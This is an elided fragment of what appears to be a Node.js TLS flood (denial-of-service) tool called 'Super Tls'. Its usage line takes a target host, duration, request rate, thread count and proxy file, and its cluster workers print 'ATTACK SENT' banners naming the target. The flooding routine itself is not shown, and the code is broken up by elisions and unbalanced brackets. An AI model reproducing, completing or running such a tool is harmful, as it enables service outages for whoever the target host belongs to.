const net = require("net");
 ...
 if (process.argv.length < 7){console.log(`Super Tls | node tls Host Time Rates Thread Proxy.file`.rainbow); process.exit();}
 const headers = {};
...
site_header = [
 ...
 if (cluster.isMaster) {
    for (let counter = 1; counter <= args.threads; counter++) {
        console.clear();
console.log(`NEW METHODS TLS | ATTACK SENT`.gray)
console.log("STATUS ".yellow + "| ATTACK SENT".rainbow);
console.log("Host :".yellow + "[+" + process.argv[2].rainbow + "]");
console.log("Thread :".yellow + "[+" + process.argv[5].rainbow + "]");
console.log("Time :".yellow + "[+" + process.argv[3].rainbow + "]");
console.log("Rate :".yellow + "[+" + process.argv[4].rainbow + "]");
console.log(`Proxy :[0m ${args.proxyFile} | Total :[0m ${proxies.length}`);
console.log(`Node :`.blue + "Super TLS | Methods Make By @haibe206 | BaoNhu209".white);
cluster.fork();
